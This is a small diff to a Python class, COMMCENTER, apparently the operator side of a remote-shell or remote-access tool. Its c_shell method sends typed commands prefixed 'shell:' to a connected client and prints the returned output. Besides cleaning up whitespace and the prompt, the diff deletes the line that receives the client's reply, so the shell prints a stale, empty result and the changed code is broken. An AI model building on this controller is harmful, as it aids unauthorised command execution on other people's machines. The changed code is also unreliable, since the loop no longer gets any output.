@@ -388,15 +388,15 @@ class COMMCENTER:
     def c_shell(self):
         result = ""
         if self.CURRENT:
-            sys.stdout.write("\n")                                                                                                                                -
+            sys.stdout.write("\n")
+
             while True:
-                val = input("# ")
+                val = input("#")
                 val = "shell:" + val.rstrip(" ").lstrip(" ")
 
                 if val:
-                    if val != "shell:exit":             
+                    if val != "shell:exit":
                         self.CURRENT[1].send_data(val)
-                        result = self.CURRENT[1].recv_data()
                         if result.strip(" "):
                             print(result)
                 else:
